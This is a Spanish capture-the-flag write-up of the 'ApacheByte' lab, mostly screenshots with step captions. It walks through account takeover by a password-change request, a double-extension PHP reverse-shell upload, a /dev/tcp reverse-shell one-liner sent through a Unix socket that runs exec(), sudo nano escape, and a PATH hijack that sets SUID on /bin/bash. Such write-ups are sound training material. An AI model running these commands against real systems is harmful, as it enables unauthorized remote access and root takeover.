<h1>Laboratorio ApacheByte</h1>
<h2>Esplegamos el laboratorio</h2>
<img width="1336" height="879" src="/ApacheByte/images/Captura de pantalla 2026-07-30 180114.png" />

<h2>Lanzamos un escaneo de nmap como parte del reconocimiento para conocer puertos abiertos y servicios activos</h2>
<img width="1336" height="879" src="/ApacheByte/images/Captura de pantalla 2026-07-30 180414.png" />

<li>Puerto 22 abierto</li>
<li>Puerto 80 abierto</li>
<h2>Mediante el reconocimiento de nmap vemos que el laboratorio tiene un servicio web activo. Entramos por medio del navegador</h2>
<img width="1336" height="879" src="/ApacheByte/images/Captura de pantalla 2026-07-30 180615.png" />
<h2>Nos creamos una cuenta e iniciamos sesion</h2>
<img width="1336" height="879" src="/ApacheByte/images/Captura de pantalla 2026-07-30 180652.png" />

<h2>Una vez que hayamos iniciado sesion, Entramos a la seccion de nuestra cuenta, a la cual vemos que tenemos las siguientes opciones: </h2>
<img width="1336" height="879" src="/ApacheByte/images/Captura de pantalla 2026-07-30 180915.png" />

<h2>Vamos a seguir con la parte de reconocimiento pero ahora se realizara un fuzzing de directorios o rutas</h2>
<img width="1336" height="879" src="/ApacheByte/images/Captura de pantalla 2026-07-30 182207.png" />

<h2>Encontramos un uploads y dentro de ese directorio vemos un directorio de avatars</h2>
<img width="1336" height="879" src="/ApacheByte/images/Captura de pantalla 2026-07-30 182219.png" />

<h2>Regresaremos a la función del cambio de contraseña de nuestro usuario creado y capturaremos la peticion mediante burpsuite</h2>
<h3>Request</h3>
<img width="1336" height="879" src="/ApacheByte/images/Captura de pantalla 2026-07-30 182325.png" />
<h2>En el sitio web se reconocio un usuario "manager" al cual intentaremos acceder, aprovechando la request de cambio de contraseña</h2>
<h2>cambiaremos nuestro usuario por el usuario manager. No funcionara ya que tenemos que saber el numero exacto del usuario manager</h2>
<h2>Pero si recordamos en la parte de /uploads/avatars/ encontramos un numero en el jpg al cual pertenece al manager.</h2>
<h2>Entonces sustituimos el nuestro usuario y nuestro numero por el de manager y ponemos cualquier contraseña</h2>
<img width="1336" height="879" src="/ApacheByte/images/Captura de pantalla 2026-07-30 182417.png" />
<h2>SE A REALIZADO EL CAMBIO DE CONTRASEÑA</h2>
<img width="1336" height="879" src="/ApacheByte/images/Captura de pantalla 2026-07-30 182428.png" />


<h2>Puntos a tomar en cuenta</h2>
<li>En ninguna parte del cambio de contraseña se pide la anterior u otra forma de validacion</li>
<li>No existe medidas de proteccion contra falsificaciones de peticiones en sitios cruzados (CSRF)</li>
<li>El CSRF permite a un atacante realizar peticiones mediante un usuario autenticado (manager) y ejecutar peticiones sin confirmar si esa solicitud viene de el</li>
<li>Se detecto un Broken Access Control la cual hace posible cambiar cualquier usuario mediante una peticion</li>

<h2>Entramos a la cuenta de manager</h2>
<img width="1336" height="879" src="/ApacheByte/images/Captura de pantalla 2026-07-30 182530.png" />

<h2>Analizando la forma de obtener una reverse shell llegue a la conclusión que podemos aprovecharnos de subir una imagen con una reverse shell hecha en php</h2>
<h2>Si subimos tal cual la reverse shell con la extesion php no nos dejara</h2>
<h2>Podremos lograr la reverse shell si ejecutamos un ataque de doble extension</h2>

<h3>ASI LLAMAREMOS AL SCRIPT: revershell.php.jpg</h3>
<h3>Reverse shell usada</h3>
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

<h2>Subimos la reverse shell con doble extesion</h2>
<img width="1336" height="879" src="/ApacheByte/images/Captura de pantalla 2026-07-30 183845.png" />
<h2>Nos dirigimos a la ruta que se nos nuestra al momento de cargar la imagen</h2>
<h2>Nos ponemos en escucha por Netcat nc -nlvp (PUERTO)</h2>
<h2>http://172.17.0.2/posts/uploads/rs.php</h2>

<h2>Reverse shell obtenida</h2>
<img width="1336" height="879" src="/ApacheByte/images/ApacheByte/images/Captura de pantalla 2026-07-30 184457.png" />

<h2>Hacemos el tratamiento de la TTY</h2>
<h2>Entramos a la ruta /var y listamos contenido dentro del directorio ls -al para ganar acceso al usuario juan ya que se encuentra en su contexto el socket</h2>
<h2>cd backups/</h2>
<h2>ls</h2>
<h2>Encontramos socket.zip</h2>
<h2>Y descomprimimos el archivo</h2>
<img width="1336" height="879" src="/ApacheByte/images/Captura de pantalla 2026-07-30 190114.png" />

<h2>Leemos el contenido</h2>
<img width="1336" height="879" src="/ApacheByte/images/Captura de pantalla 2026-07-30 190326.png" />
<li>import socket: Importa la librería para crear y administrar conexiones mediante sockets.</li>
<li>import os: Importa la librería para trabajar con archivos, rutas y permisos del sistema operativo.</li>
<li>sock_path = "/tmp/dev.sock": Define la ubicación donde se creará el socket Unix.</li>
<li>if os.path.exists(sock_path): os.remove(sock_path): Verifica si el socket ya existe y lo elimina para evitar errores al crear uno nuevo.</li>
<li>server=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM): Crea un socket Unix orientado a conexión para la comunicación entre procesos en la misma máquina</li>
<li>server.bind(sock_path): Asocia el socket a la ruta /tmp/dev.sock para que los clientes puedan conectarse.</li>
<li>os.chmod(sock_path, 0o777): Asigna permisos de lectura, escritura y ejecución a todos los usuarios sobre el socket.</li>
<li>server.listen(1): Pone el servidor en espera de conexiones entrantes.</li>
<li>while True:: Mantiene el servidor ejecutándose continuamente para aceptar múltiples conexiones.</li>
<li>conn, _ = server.accept(): Espera y acepta la conexión de un cliente.</li>
<li>data = conn.recv(2048): Recibe hasta 2048 bytes de información enviados por el cliente.</li>
<li>if data:: Comprueba que se hayan recibido datos antes de procesarlos.</li>
<li>exec(data.decode(), {"__builtins__": __builtins__}): Convierte los datos recibidos en texto y los ejecuta como código Python.</li>
<li>conn.send(b"Executed.\n"): Envía al cliente un mensaje indicando que el código se ejecutó correctamente.</li>
<li>except Exception as e: conn.send(str(e).encode()): Si ocurre un error durante la ejecución, envía el mensaje de error al cliente.</li>
<li>conn.close(): Cierra la conexión con el cliente una vez finalizada la comunicación.</li>
<li>except: break: Si ocurre un error grave en el servidor, sale del bucle principal.</li>
<li>server.close(): Cierra el servidor y libera el socket cuando termina su ejecución.</li>

<h2>Aprovecharemos el uso del sockey y de exec() para ejecutar comandos y ganar una reverse shell</h2>
<h2>echo 'import subprocess; raise Exception(subprocess.check_output("bash -c \"bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\"", shell=True, stderr=subprocess.STDOUT).decode())' | nc -U /tmp/dev.sock</h2>

<h2>Ejecutamos y nos ponemos en escucha mediante Netcat y listo ahora somos el usuario Juan</h2>
<img width="1336" height="879" src="/ApacheByte/images/Captura de pantalla 2026-07-30 190906.png" />

<h2>haremos un sudo -l y para escalar al usuario alex, vemos que tiene el binario nano</h2>
<h2>Para escalar a ese usuario haremos simplemente esto: </h2>
<li>sudo -u alex nano</li>
<li>Ctrl + R</li>
<li>Ctril + X</li>
<li>reset; bash 1>&0 2>&0</li>

<h2>Usuario alex obtenido</h2>
<img width="1336" height="879" src="/ApacheByte/images/Captura de pantalla 2026-07-30 191337.png" />
<h2>Vemos que el usuario alex tiene el binario report_tool como el usuario root</h2>
<img width="1336" height="879" src="/ApacheByte/images/Captura de pantalla 2026-07-30 191402.png" />
<h2>Encontramos una vulnerabilidad muy grave en el script report_tool:
Porque confía en un archivo de configuración controlable por el usuario para modificar el PATH y luego ejecuta un comando sin especificar su ruta absoluta. Esto puede permitir que se ejecute un programa malicioso con los privilegios del script si este corre con permisos elevados. Esta técnica se conoce como PATH Hijacking
</h2>

<h2>Ahora haremos lo siguiente para obtener root:</h2>
<li>cd /tmp</li>
<li>echo '/bin/bash -c "chmod u+s /bin/bash"' > ./report_tool.conf</li>
<li>chmod +x report_tool.conf</li>
<li>sudo /usr/local/bin/report_tool</li>

<h3>Realizamos un ls -al /bin/bash para ver que tengamos permisos root en la bash</h3>
<li>Si aparece asi ya tenemos permisos: -rwsr-xr-x </li>

<h3>Ejecutamos un bash -p y listo ROOT OBTENIDO :)</h3>
<img width="1336" height="879" src="/ApacheByte/images/Captura de pantalla 2026-07-30 191858.png" />


<h3>CREDITOS A: vareCruzz</h3>
